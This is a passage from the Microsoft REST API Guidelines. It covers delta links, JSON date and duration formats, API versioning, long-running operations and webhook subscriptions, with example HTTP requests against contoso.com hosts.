invoking the GET method on the delta link. The client MUST use the delta URL as is -- in other words the client MUST NOT modify the URL in any way (e.g., parsing it and adding additional query string parameters). In this example: GET https://{opaqueUrl} HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { \"value\":[ { \"id\": \"1\", \"name\": \"Mat\"}, { \"id\": \"2\", \"name\": \"Marc\"}, { \"id\": \"3\", \"@removed\": {} }, { \"id\": \"4\", \"name\": \"Luc\"} ], \"@deltaLink\": \"{opaqueUrl}\" } The results of a request against the delta link may span multiple pages but MUST be ordered by the service across all pages in such a way as to ensure a deterministic result when applied in order to the response that contained the delta link. If no changes have occurred, the response is an empty collection that contains a delta link for subsequent changes if requested. This delta link MAY be identical to the delta link resulting in the empty collection of changes. If the delta link is no longer valid, the service MUST respond with 410 Gone. The response SHOULD include a Location header that the client can use to retrieve a new baseline set of results. 11 JSON standardizations 11.1 JSON formatting standardization for primitive types Primitive values MUST be serialized to JSON following the rules of RFC4627. 11.2 Guidelines for dates and times 11.2.1 Producing dates Services MUST produce dates using the DateLiteral format, and SHOULD use the Iso8601Literal format unless there are compelling reasons to do otherwise. Services that do use the StructuredDateLiteral format MUST NOT produce dates using the T kind unless BOTH the additional precision is REQUIRED and ECMAScript clients are explicitly unsupported. (Non-Normative statement: When deciding which particular DateKind to standardize on, the approximate order of preference is E, C, U, W, O, X, I, T. This optimizes for ECMAScript, .NET, and C++ programmers, in that order.) 11.2.2 Consuming dates Services MUST accept dates from clients that use the same DateLiteral format (including the DateKind, if applicable) that they produce, and SHOULD accept dates using any DateLiteral format. 11.2.3 Compatibility Services MUST use the same DateLiteral format (including the same DateKind, if applicable) for all resources of the same type, and SHOULD use the same DateLiteral format (and DateKind, if applicable) for all resources across the entire service. Any change to the DateLiteral format produced by the service (including the DateKind, if applicable) and any reductions in the DateLiteral formats (and DateKind, if applicable) accepted by the service MUST be treated as a breaking change. Any widening of the DateLiteral formats accepted by the service is NOT considered a breaking change. 11.3 JSON serialization of dates and times Round-tripping serialized dates with JSON is a hard problem. Although ECMAScript supports literals for most built-in types, it does not define a literal format for dates. The Web has coalesced around the ECMAScript subset of ISO 8601 date formats (ISO 8601), but there are situations where this format is not desirable. For those cases, this document defines a JSON serialization format that can be used to unambiguously represent dates in different formats. Other serialization formats (such as XML) could be derived from this format. 11.3.1 The DateLiteral format Dates represented in JSON are serialized using the following grammar. Informally, a DateValue is either an ISO 8601-formatted string or a JSON object containing two properties named kind and value that together define a point in time. The following is not a context-free grammar; in particular, the interpretation of DateValue depends on the value of DateKind, but this minimizes the number of productions required to describe the format. DateLiteral: Iso8601Literal StructuredDateLiteral Iso8601Literal: A string literal as defined in http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15. Note that the full grammar for ISO 8601 (such as \"basic format\" without separators) is not supported. All dates default to UTC unless specified otherwise. StructuredDateLiteral: { DateKindProperty , DateValueProperty } { DateValueProperty , DateKindProperty } DateKindProperty \"kind\" : DateKind DateKind: \"C\" ; see below \"E\" ; see below \"I\" ; see below \"O\" ; see below \"T\" ; see below \"U\" ; see below \"W\" ; see below \"X\" ; see below DateValueProperty: \"value\" : DateValue DateValue: UnsignedInteger ; not defined here SignedInteger ; not defined here RealNumber ; not defined here Iso8601Literal ; as above 11.3.2 Commentary on date formatting A DateLiteral using the Iso8601Literal production is relatively straightforward. Here is an example of an object with a property named creationDate that is set to February 13, 2015, at 1:15 p.m. UTC: { \"creationDate\" : \"2015-02-13T13:15Z\" } The StructuredDateLiteral consists of a DateKind and an accompanying DateValue whose valid values (and their interpretation) depend on the DateKind. The following table describes the valid combinations and their meaning: DateKind DateValue Colloquial Name & Interpretation More Info C UnsignedInteger \"CLR\"; number of milliseconds since midnight January 1, 0001; negative values are not allowed. See note below. MSDN E SignedInteger \"ECMAScript\"; number of milliseconds since midnight, January 1, 1970. ECMA International I Iso8601Literal \"ISO 8601\"; a string limited to the ECMAScript subset. O RealNumber \"OLE Date\"; integral part is the number of days since midnight, December 31, 1899, and fractional part is the time within the day (0.5 = midday). MSDN T SignedInteger \"Ticks\"; number of ticks (100-nanosecond intervals) since midnight January 1, 1601. See note below. MSDN U SignedInteger \"UNIX\"; number of seconds since midnight, January 1, 1970. MSDN W SignedInteger \"Windows\"; number of milliseconds since midnight January 1, 1601. See note below. MSDN X RealNumber \"Excel\"; as for O but the year 1900 is incorrectly treated as a leap year, and day 0 is \"January 0 (zero).\" Microsoft Support Important note for C and W kinds: The native CLR and Windows times are represented by 100-nanosecond \"tick\" values. To interoperate with ECMAScript clients that have limited precision, these values MUST be converted to and from milliseconds when (de)serialized as a DateLiteral. One millisecond is equivalent to 10,000 ticks. Important note for T kind: This kind preserves the full fidelity of the Windows native time formats (and is trivially convertible to and from the native CLR format) but is incompatible with ECMAScript clients. Therefore, its use SHOULD be limited to only those scenarios that both require the additional precision and do not need to interoperate with ECMAScript clients. Here is the same example of an object with a property named creationDate that is set to February 13, 2015, at 1:15 p.m. UTC, using several formats: [ { \"creationDate\" : { \"kind\" : \"O\", \"value\" : 42048.55 } }, { \"creationDate\" : { \"kind\" : \"E\", \"value\" : 1423862100000 } } ] One of the benefits of separating the kind from the value is that once a client knows the kind used by a particular service, it can interpret the value without requiring any additional parsing. In the common case of the value being a number, this makes coding easier for developers: // We know this service always gives out ECMAScript-format dates var date = new Date(serverResponse.someObject.creationDate.value); 11.4 Durations Durations need to be serialized in conformance with ISO 8601. Durations are \"represented by the format P[n]Y[n]M[n]DT[n]H[n]M[n]S.\" From the standard: P is the duration designator (historically called \"period\") placed at the start of the duration representation. Y is the year designator that follows the value for the number of years. M is the month designator that follows the value for the number of months. W is the week designator that follows the value for the number of weeks. D is the day designator that follows the value for the number of days. T is the time designator that precedes the time components of the representation. H is the hour designator that follows the value for the number of hours. M is the minute designator that follows the value for the number of minutes. S is the second designator that follows the value for the number of seconds. For example, \"P3Y6M4DT12H30M5S\" represents a duration of \"three years, six months, four days, twelve hours, thirty minutes, and five seconds.\" 11.5 Intervals Intervals are defined as part of ISO 8601. Start and end, such as \"2007-03-01T13:00:00Z/2008-05-11T15:30:00Z\" Start and duration, such as \"2007-03-01T13:00:00Z/P1Y2M10DT2H30M\" Duration and end, such as \"P1Y2M10DT2H30M/2008-05-11T15:30:00Z\" Duration only, such as \"P1Y2M10DT2H30M,\" with additional context information 11.6 Repeating intervals Repeating Intervals, as per ISO 8601, are: Formed by adding \"R[n]/\" to the beginning of an interval expression, where R is used as the letter itself and [n] is replaced by the number of repetitions. Leaving out the value for [n] means an unbounded number of repetitions. For example, to repeat the interval of \"P1Y2M10DT2H30M\" five times starting at \"2008-03-01T13:00:00Z,\" use \"R5/2008-03-01T13:00:00Z/P1Y2M10DT2H30M.\" 12 Versioning All APIs compliant with the Microsoft REST API Guidelines MUST support explicit versioning. It's critical that clients can count on services to be stable over time, and it's critical that services can add features and make changes. 12.1 Versioning formats Services are versioned using a Major.Minor versioning scheme. Services MAY opt for a \"Major\" only version scheme in which case the \".0\" is implied and all other rules in this section apply. Two options for specifying the version of a REST API request are supported: Embedded in the path of the request URL, at the end of the service root: https://api.contoso.com/v1.0/products/users As a query string parameter of the URL: https://api.contoso.com/products/users?api-version=1.0 Guidance for choosing between the two options is as follows: Services co-located behind a DNS endpoint MUST use the same versioning mechanism. In this scenario, a consistent user experience across the endpoint is paramount. The Microsoft REST API Guidelines Working Group recommends that new top-level DNS endpoints are not created without explicit conversations with your organization's leadership team. Services that guarantee the stability of their REST API's URL paths, even through future versions of the API, MAY adopt the query string parameter mechanism. This means the naming and structure of the relationships described in the API cannot evolve after the API ships, even across versions with breaking changes. Services that cannot ensure URL path stability across future versions MUST embed the version in the URL path. Certain bedrock services such as Microsoft's Azure Active Directory may be exposed behind multiple endpoints. Such services MUST support the versioning mechanisms of each endpoint, even if that means supporting multiple versioning mechanisms. 12.1.1 Group versioning Group versioning is an OPTIONAL feature that MAY be offered on services using the query string parameter mechanism. Group versions allow for logical grouping of API endpoints under a common versioning moniker. This allows developers to look up a single version number and use it across multiple endpoints. Group version numbers are well known, and services SHOULD reject any unrecognized values. Internally, services will take a Group Version and map it to the appropriate Major.Minor version. The Group Version format is defined as YYYY-MM-DD, for example 2012-12-07 for December 7, 2012. This Date versioning format applies only to Group Versions and SHOULD NOT be used as an alternative to Major.Minor versioning. 12.1.1.1 Examples of group versioning Group Major.Minor 2012-12-01 1.0 2013-03-21 | 1.0 | 2.0 | 3.0 | 3.1 | 3.2 | 3.3 Version Format Example Interpretation {groupVersion} 2013-03-21, 2012-12-01 3.3, 1.2 {majorVersion} 3 3.0 {majorVersion}.{minorVersion} 1.2 1.2 Clients can specify either the group version or the Major.Minor version: For example: GET http://api.contoso.com/acct1/c1/blob2?api-version=1.0 PUT http://api.contoso.com/acct1/c1/b2?api-version=2011-12-07 12.2 When to version Services MUST increment their version number in response to any breaking API change. See the following section for a detailed discussion of what constitutes a breaking change. Services MAY increment their version number for nonbreaking changes as well, if desired. Use a new major version number to signal that support for existing clients will be deprecated in the future. When introducing a new major version, services MUST provide a clear upgrade path for existing clients and develop a plan for deprecation that is consistent with their business group's policies. Services SHOULD use a new minor version number for all other changes. Online documentation of versioned services MUST indicate the current support status of each previous API version and provide a path to the latest version. 12.3 Definition of a breaking change Changes to the contract of an API are considered a breaking change. Changes that impact the backwards compatibility of an API are a breaking change. Teams MAY define backwards compatibility as their business needs require. For example, Azure defines the addition of a new JSON field in a response to be not backwards compatible. Office 365 has a looser definition of backwards compatibility and allows JSON fields to be added to responses. Clear examples of breaking changes: Removing or renaming APIs or API parameters Changes in behavior for an existing API Changes in Error Codes and Fault Contracts Anything that would violate the Principle of Least Astonishment Services MUST explicitly define their definition of a breaking change, especially with regard to adding new fields to JSON responses and adding new API arguments with default fields. Services that are co-located behind a DNS Endpoint with other services MUST be consistent in defining contract extensibility. The applicable changes described in this section of the OData V4 spec SHOULD be considered part of the minimum bar that all services MUST consider a breaking change. 13 Long running operations Long running operations, sometimes called async operations, tend to mean different things to different people. This section sets forth guidance around different types of long running operations, and describes the wire protocols and best practices for these types of operations. One or more clients MUST be able to monitor and operate on the same resource at the same time. The state of the system SHOULD be discoverable and testable at all times. Clients SHOULD be able to determine the system state even if the operation tracking resource is no longer active. The act of querying the state of a long running operation should itself leverage principles of the web. i.e. well defined resources with uniform interface semantics. Clients MAY issue a GET on some resource to determine the state of a long running operation Long running operations SHOULD work for clients looking to \"Fire and Forget\" and for clients looking to actively monitor and act upon results. Cancellation does not explicitly mean rollback. On a per-API defined case it may mean rollback, or compensation, or completion, or partial completion, etc. Following a cancelled operation, It SHOULD NOT be a client's responsibility to return the service to a consistent state which allows continued service. 13.1 Resource based long running operations (RELO) Resource based modeling is where the status of an operation is encoded in the resource and the wire protocol used is the standard synchronous protocol. In this model state transitions are well defined and goal states are similarly defined. This is the preferred model for long running operations and should be used wherever possible. Avoiding the complexity and mechanics of the LRO Wire Protocol makes things simpler for our users and tooling chain. An example may be a machine reboot, where the operation itself completes synchronously but the GET operation on the virtual machine resource would have a \"state: Rebooting\", \"state: Running\" that could be queried at any time. This model MAY integrate Push Notifications. While most operations are likely to be POST semantics, In addition to POST semantics services MAY support PUT semantics via routing to simplify their APIs. For example, a user that wants to create a database named \"db1\" could call: PUT https://api.contoso.com/v1.0/databases/db1 In this scenario the databases segment is processing the PUT operation. Services MAY also use the hybrid defined below. 13.2 Stepwise long running operations A stepwise operation is one that takes a long, and often unpredictable, length of time to complete, and doesn't offer state transition modeled in the resource. This section outlines the approach that services should use to expose such long running operations. Service MAY expose stepwise operations. Stepwise Long Running Operations are sometimes called \"Async\" operations. This causes confusion, as it mixes elements of platforms (\"Async / await\", \"promises\", \"futures\") with elements of API operation. This document uses the term \"Stepwise Long Running Operation\" or often just \"Stepwise Operation\" to avoid confusion over the word \"Async\". Services MUST perform as much synchronous validation as practical on stepwise requests. Services MUST prioritize returning errors in a synchronous way, with the goal of having only \"Valid\" operations processed using the long running operation wire protocol. For an API that's defined as a Stepwise Long Running Operation the service MUST go through the Stepwise Long Running Operation flow even if the operation can be completed immediately. In other words, APIs must adopt and stick with a LRO pattern and not change patterns based on circumstance. 13.2.1 PUT Services MAY enable PUT requests for entity creation. PUT https://api.contoso.com/v1.0/databases/db1 In this scenario the databases segment is processing the PUT operation. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 For services that need to return a 201 Created here, use the hybrid flow described below. The 202 Accepted should return no body. The 201 Created case should return the body of the target resource. 13.2.2 POST Services MAY enable POST requests for entity creation. POST https://api.contoso.com/v1.0/databases/ { \"fileName\": \"someFile.db\", \"color\": \"red\" } HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 13.2.3 POST, hybrid model Services MAY respond synchronously to POST requests to collections that create a resource even if the resources aren't fully created when the response is generated. In order to use this pattern, the response MUST include a representation of the incomplete resource and an indication that it is incomplete. For example: POST https://api.contoso.com/v1.0/databases/ HTTP/1.1 Host: api.contoso.com Content-Type: application/json Accept: application/json { \"fileName\": \"someFile.db\", \"color\": \"red\" } Service response says the database has been created, but indicates the request is not completed by including the Operation-Location header. In this case the status property in the response payload also indicates the operation has not fully completed. HTTP/1.1 201 Created Location: https://api.contoso.com/v1.0/databases/db1 Operation-Location: https://api.contoso.com/v1.0/operations/123 { \"databaseName\": \"db1\", \"color\": \"red\", \"Status\": \"Provisioning\", [ other fields for \"database\" ] } 13.2.4 Operations resource Services MAY provide a \"/operations\" resource at the tenant level. Services that provide the \"/operations\" resource MUST provide GET semantics. GET MUST enumerate the set of operations, following standard pagination, sorting, and filtering semantics. The default sort order for this operation MUST be: Primary Sort Secondary Sort Not Started Operations Operation Creation Time Running Operations Operation Creation Time Completed Operations Operation Creation Time Note that \"Completed Operations\" is a goal state (see below), and may actually be any of several different states such as \"successful\", \"cancelled\", \"failed\" and so forth. 13.2.5 Operation resource An operation is a user addressable resource that tracks a stepwise long running operation. Operations MUST support GET semantics. The GET operation against an operation MUST return: The operation resource, it's state, and any extended state relevant to the particular API. 200 OK as the response code. Services MAY support operation cancellation by exposing DELETE on the operation. If supported DELETE operations MUST be idempotent. Note: From an API design perspective, cancellation does not explicitly mean rollback. On a per-API defined case it may mean rollback, or compensation, or completion, or partial completion, etc. Following a cancelled operation It SHOULD NOT be a client's responsibility to return the service to a consistent state which allows continued service. Services that do not support operation cancellation MUST return a 405 Method Not Allowed in the event of a DELETE. Operations MUST support the following states: NotStarted Running Succeeded. Terminal State. Failed. Terminal State. Services MAY add additional states, such as \"Cancelled\" or \"Partially Completed\". Services that support cancellation MUST sufficiently describe their cancellation such that the state of the system can be accurately determined and any compensating actions may be run. Services that support additional states should consider this list of canonical names and avoid creating new names if possible: Cancelling, Cancelled, Aborting, Aborted, Tombstone, Deleting, Deleted. An operation MUST contain, and provide in the GET response, the following information: The timestamp when the operation was created. A timestamp for when the current state was entered. The operation state (notstarted / running / completed). Services MAY add additional, API specific, fields into the operation. The operation status JSON returned looks like: { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-01-03.45Z\", \"status\": \"notstarted | running | succeeded | failed\" } 13.2.5.1 Percent complete Sometimes it is impossible for services to know with any accuracy when an operation will complete. Which makes using the Retry-After header problematic. In that case, services MAY include, in the operationStatus JSON, a percent complete field. { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"percentComplete\": \"50\", \"status\": \"running\" } In this example the server has indicated to the client that the long running operation is 50% complete. 13.2.5.2 Target resource location For operations that result in, or manipulate, a resource the service MUST include the target resource location in the status upon operation completion. { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-06-03.0024Z\", \"status\": \"succeeded\", \"resourceLocation\": \"https://api.contoso.com/v1.0/databases/db1\" } 13.2.6 Operation tombstones Services MAY choose to support tombstoned operations. Services MAY choose to delete tombstones after a service defined period of time. 13.2.7 The typical flow, polling Client invokes a stepwise operation by invoking an action using POST The server MUST indicate the request has been started by responding with a 202 Accepted status code. The response SHOULD include the location header containing a URL that the client should poll for the results after waiting the number of seconds specified in the Retry-After header. Client polls the location until receiving a 200 OK response from the server. 13.2.7.1 Example of the typical flow, polling Client invokes the restart action: POST https://api.contoso.com/v1.0/databases HTTP/1.1 Accept: application/json { \"fromFile\": \"myFile.db\", \"color\": \"red\" } The server response indicates the request has been created. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 Client waits for a period of time then invokes another request to try to get the operation status. GET https://api.contoso.com/v1.0/operations/123 Accept: application/json Server responds that results are still not ready and optionally provides a recommendation to wait 30 seconds. HTTP/1.1 200 OK Retry-After: 30 { \"createdDateTime\": \"2015-06-19T12-01-03.4Z\", \"status\": \"running\" } Client waits the recommended 30 seconds and then invokes another request to get the results of the operation. GET https://api.contoso.com/v1.0/operations/123 Accept: application/json Server responds with a \"status:succeeded\" operation that includes the resource location. HTTP/1.1 200 OK Content-Type: application/json { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-06-03.0024Z\", \"status\": \"succeeded\", \"resourceLocation\": \"https://api.contoso.com/v1.0/databases/db1\" } 13.2.8 The typical flow, push notifications Client invokes a long running operation by invoking an action using POST. The client has a push notification already setup on the parent resource. The service indicates the request has been started by responding with a 202 Accepted status code. The client ignores everything else. Upon completion of the overall operation the service pushes a notification via the subscription on the parent resource. The client retrieves the operation result via the resource URL. 13.2.8.1 Example of the typical flow, push notifications existing subscription Client invokes the backup action. The client already has a push notification subscription setup for db1. POST https://api.contoso.com/v1.0/databases/db1?backup HTTP/1.1 Accept: application/json The server response indicates the request has been accepted. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 The caller ignores all the headers in the return. The target URL receives a push notification when the operation is complete. HTTP/1.1 200 OK Content-Type: application/json { \"value\": [ { \"subscriptionId\": \"1234-5678-1111-2222\", \"context\": \"subscription context that was specified at setup\", \"resourceUrl\": \"https://api.contoso.com/v1.0/databases/db1\", \"userId\" : \"contoso.com/user@contoso.com\", \"tenantId\" : \"contoso.com\" } ] } 13.2.9 Retry-After In the examples above the Retry-After header indicates the number of seconds that the client should wait before trying to get the result from the URL identified by the location header. The HTTP specification allows the Retry-After header to alternatively specify a HTTP date, so clients should be prepared to handle this as well. HTTP/1.1 202 Accepted Operation-Location: http://api.contoso.com/v1.0/operations/123 Retry-After: 60 Note: The use of the HTTP Date is inconsistent with the use of ISO 8601 Date Format used throughout this document, but is explicitly defined by the HTTP standard in [RFC 7231][rfc-7231-7-1-1-1]. Services SHOULD prefer the integer number of seconds (in decimal) format over the HTTP date format. 13.3 Retention policy for operation results In some situations, the result of a long running operation is not a resource that can be addressed. For example, if you invoke a long running Action that returns a Boolean (rather than a resource). In these situations, the Location header points to a place where the Boolean result can be retrieved. Which begs the question: \"How long should operation results be retained?\" A recommended minimum retention time is 24 hours. Operations SHOULD transition to \"tombstone\" for an additional period of time prior to being purged from the system. 14 Push notifications via webhooks 14.1 Scope Services MAY implement push notifications via web hooks. This section addresses the following key scenario: Push notification via HTTP Callbacks, often called Web Hooks, to publicly-addressable servers. The approach set forth is chosen due to its simplicity, broad applicability, and low barrier to entry for service subscribers. It's intended as a minimal set of requirements and as a starting point for additional functionality. 14.2 Principles The core principles for services that support web hooks are: Services MUST implement at least a poke/pull model. In the poke/pull model, a notification is sent to a client, and clients then send a request to get the current state or the record of change since their last notification. This approach avoids complexities around message ordering, missed messages, and change sets. Services MAY add more data to provide rich notifications. Services MUST implement the challenge/response protocol for configuring callback URLs. Services SHOULD have a recommended age-out period, with flexibility for services to vary based on scenario. Services SHOULD allow subscriptions that are raising successful notifications to live forever and SHOULD be tolerant of reasonable outage periods. Firehose subscriptions MUST be delivered only over HTTPS. Services SHOULD require other subscription types to be HTTPS. See the \"Security\" section for more details. 14.3 Types of subscriptions There are two subscription types, and services MAY implement either, both, or none. The supported subscription types are: Firehose subscriptions a subscription is manually created for the subscribing application, typically in an app registration portal. Notifications of activity that any users have consented to the app receiving are sent to this single subscription. Per-resource subscriptions the subscribing application uses code to programmatically create a subscription at runtime for some user-specific entity(s). Services that support both subscription types SHOULD provide differentiated developer experiences for the two types: Firehose Services MUST NOT require developers to create code except to directly verify and respond to notifications. Services MUST provide administrative UI for subscription management. Services SHOULD NOT assume that end users are aware of the subscription, only the subscribing application's functionality. Per-user Services MUST provide an API for developers to create and manage subscriptions as part of their app as well as verifying and responding to notifications. Services MAY expect end users to be aware of subscriptions and MUST allow end users to revoke subscriptions where they were created directly in response to user actions. 14.4 Call sequences The call sequence for a firehose subscription MUST follow the diagram below. It shows manual registration of application and subscription, and then the end user making use of one of the service's APIs. At this part of the flow, two things MUST be stored: The service MUST store the end user's act of consent to receiving notifications from this specific application (typically a background usage OAUTH scope.) The subscribing application MUST store the end user's tokens in order to call back for details once notified of changes. The final part of the sequence is the notification flow itself. Non-normative implementation guidance: A resource in the service changes and the service needs to run the following logic: Determine the set of users who have access to the resource, and could thus expect apps to receive notifications about it on their behalf. See which of those users have consented to receiving notifications and from which apps. See which apps have registered a firehose subscription. Join 1, 2, 3 to produce the concrete set of notifications that must be sent to apps. It should be noted that the act of user consent and the act of setting up a firehose subscription could arrive in either order. Services SHOULD send notifications with setup processed in either order. For a per-user subscription, app registration is either manual or automated. The call flow for a per-user subscription MUST follow the diagram below. It shows the end user making use of one of the service's APIs, and again, the same two things MUST be stored: The service MUST store the end user's act of consent to receiving notifications from this specific application (typically a background usage OAUTH scope). The subscribing application MUST store the end user's tokens in order to call back for details once notified of changes. In this case, the subscription is set up programmatically using the end-user's token from the subscribing application. The app MUST store the ID of the registered subscription alongside the user tokens. Non normative implementation guidance: In the final part of the sequence, when an item of data in the service changes and the service needs to run the following logic: Find the set of subscriptions that correspond via resource to the data that changed. For subscriptions created under an app+user token, send a notification to the app per subscription with the subscription ID and user id of the subscription-creator. For subscriptions created with an app only token, check that the owner of the changed data or any user that has visibility of the changed data has consented to notifications to the application, and if so send a set of notifications per user id to the app per subscription with the subscription ID. 14.5 Verifying subscriptions When subscriptions change either programmatically or in response to change via administrative UI portals, the subscribing service needs to be protected from malicious or unexpected calls from services pushing potentially large volumes of notification traffic. For all subscriptions, whether firehose or per-user, services MUST send a verification request as part of creation or modification via portal UI or API request, before sending any other notifications. Verification requests MUST be of the following format as an HTTP/HTTPS POST to the subscription's notificationUrl. POST https://{notificationUrl}?validationToken={randomString} ClientState: clientOriginatedOpaqueToken (if provided by client on subscription-creation) Content-Length: 0 For the subscription to be set up, the application MUST respond with 200 OK to this request, with the validationToken value as the sole entity body. Note that if the notificationUrl contains query parameters, the validationToken parameter must be appended with an &. If any challenge request does not receive the prescribed response within 5 seconds of sending the request, the service MUST return an error, MUST NOT create the subscription, and MUST NOT send further requests or notifications to notificationUrl. Services MAY perform additional validations on URL ownership. 14.6 Receiving notifications Services SHOULD send notifications in response to service data changes that do not include details of the changes themselves, but include enough information for the subscribing application to respond appropriately to the following process: Applications MUST identify the correct cached OAuth token to use for a callback Applications MAY look up any previous delta token for the relevant scope of change Applications MUST determine the URL to call to perform the relevant query for the new state of the service, which MAY be a delta query. Services that are providing notifications that will be relayed to end users MAY choose to add more detail to notification packets in order to reduce incoming call load on their service. Such services MUST be clear that notifications are not guaranteed to be delivered and may be lossy or out of order. Notifications MAY be aggregated and sent in batches. Applications MUST be prepared to receive multiple events inside a single push notification. The service MUST send all Web Hook data notifications as POST requests. Services MUST allow for a 30-second timeout for notifications. If a timeout occurs or the application responds with a 5xx response, then the service SHOULD retry the notification with exponential back-off. All other responses will be ignored. The service MUST NOT follow 301/302 redirect requests. 14.6.1 Notification payload The basic format for notification payloads is a list of events, each containing the id of the subscription whose referenced resources have changed, the type of change, the resource that should be consumed to identify the exact details of the change and sufficient identity information to look up the token required to call that resource. For a firehose subscription, a concrete example of this may look like: { \"value\": [ { \"subscriptionId\": \"32b8cbd6174ab18b\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files?$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" } ] } For a per-user subscription, a concrete example of this may look like: { \"value\": [ { \"subscriptionId\": \"32b8cbd6174ab183\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files/$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" }, { \"subscriptionId\": \"97b391179fa22\", \"clientState \": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files/$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" } ] } Following is a detailed description of the JSON payload. A notification item consists a top-level object that contains an array of events, each of which identified the subscription due to which this notification is being sent. Field Description value Array of events that have been raised within the subscriptions scope since the last notification. Each item of the events array contains the following properties: Field Description subscriptionId The id of the subscription due to which this notification has been sent.Services MUST provide the subscriptionId field. clientState Services MUST provide the clientState field if it was provided at subscription creation time. expirationDateTime Services MUST provide the expirationDateTime field if the subscription has one. resource Services MUST provide the resource field. This URL MUST be considered opaque by the subscribing application. In the case of a richer notification it MAY be subsumed by message content that implicitly contains the resource URL to avoid duplication.If a service is providing this data as part of a more detailed data packet, then it need not be duplicated. userId Services MUST provide this field for user-scoped resources. In the case of user-scoped resources, the unique identifier for the user should be used.In the case of resources shared between a specific set of users, multiple notifications must be sent, passing the unique identifier of each user.For tenant-scoped resources, the user id of the subscription should be used. tenantId Services that wish to support cross-tenant requests SHOULD provide this field. Services that provide notifications on tenant-scoped data MUST send this field. 14.7 Managing subscriptions programmatically For per-user subscriptions, an API MUST be provided to create and manage subscriptions. The API must support at least the operations described here. 14.7.1 Creating subscriptions A client creates a subscription by issuing a POST request against the subscriptions resource. The subscription namespace is client-defined via the POST operation. https://api.contoso.com/apiVersion/$subscriptions The POST request contains a single subscription object to be created. That subscription object has the following properties: Property Name Required Notes resource Yes Resource path to watch. notificationUrl Yes The target web hook URL. clientState No Opaque string passed back to the client on all notifications. Callers may choose to use this to provide tagging mechanisms. If the subscription was successfully created, the service MUST respond with the status code 201 CREATED and a body containing at least the following properties: Property Name Required Notes id Yes Unique ID of the new subscription that can be used later to update/delete the subscription. expirationDateTime No Uses existing Microsoft REST API Guidelines defined time formats. Creation of subscriptions SHOULD be idempotent. The combination of properties scoped to the auth token, provides a uniqueness constraint. Below is an example request using a User + Application principal to subscribe to notifications from a file: POST https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} { \"resource\": \"http://api.service.com/v1.0/files/file1.txt\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\" } The service SHOULD respond to such a message with a response format minimally like this: { \"id\": \"32b8cbd6174ab18b\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } Below is an example using an Application-Only principal where the application is watching all files to which it's authorized: POST https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {ApplicationPrincipalBearerToken} { \"resource\": \"All.Files\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\" } The service SHOULD respond to such a message with a response format minimally like this: { \"id\": \"8cbd6174abb391179\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } 14.7.2 Updating subscriptions Services MAY support amending subscriptions. To update the properties of an existing subscription, clients use PATCH requests providing the ID and the properties that need to change. Omitted properties will retain their values. To delete a property, assign a value of JSON null to it. As with creation, subscriptions are individually managed. The following request changes the notification URL of an existing subscription: PATCH https://api.contoso.com/files/v1.0/$subscriptions/{id} HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} { \"notificationUrl\": \"https://contoso.com/myNewCallback\" } If the PATCH request contains a new notificationUrl, the server MUST perform validation on it as described above. If the new URL fails to validate, the service MUST fail the PATCH request and leave the subscription in its previous state. The service MUST return an empty body and 204 No Content to indicate a successful patch. The service MUST return an error body and status code if the patch failed. The operation MUST succeed or fail atomically. 14.7.3 Deleting subscriptions Services MUST support deleting subscriptions. Existing subscriptions can be deleted by making a DELETE request against the subscription resource: DELETE https://api.contoso.com/files/v1.0/$subscriptions/{id} HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} As with update, the service MUST return 204 No Content for a successful delete, or an error body and status code to indicate failure. 14.7.4 Enumerating subscriptions To get a list of active subscriptions, clients issue a GET request against the subscriptions resource using a User + Application or Application-Only bearer token: GET https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} The service MUST return a format as below using a User + Application principal bearer token: { \"value\": [ { \"id\": \"32b8cbd6174ab18b\", \"resource\": \" http://api.contoso.com/v1.0/files/file1.txt\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } ] } An example that may be returned using Application-Only principal bearer token: { \"value\": [ { \"id\": \"6174ab18bfa22\", \"resource\": \"All.Files \", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } ] } 14.8 Security All service URLs must be HTTPS (that is, all inbound calls MUST be HTTPS). Services that deal with Web Hooks MUST accept HTTPS. We recommend that services that allow client defined Web Hook Callback URLs SHOULD NOT transmit data over HTTP. This is because information can be inadvertently exposed via client, network, server logs and other mechanisms. However, there are scenarios where the above recommendations cannot be followed due to client endpoint or software limitations. Consequently, services MAY allow web hook URLs that are 